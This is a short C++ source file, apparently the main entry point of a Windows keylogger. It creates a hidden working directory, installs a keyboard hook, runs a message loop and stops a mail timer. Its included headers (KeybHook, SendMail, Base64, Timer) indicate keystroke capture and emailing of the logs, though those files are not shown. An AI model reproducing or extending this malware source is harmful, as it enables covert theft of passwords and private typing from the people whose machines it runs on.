#include <bits/stdc++.h>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"


int main(int argc, char const *argv[]){
	MSG Msg;
	IO::MKDir(IO::GetOurPath(true));
	InstallHook();
	//basically nothing but a infinite loop 
	while(GetMessage(&Msg,NULL,0,0)){
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	MailTimer.Stop();
	return 0;
 }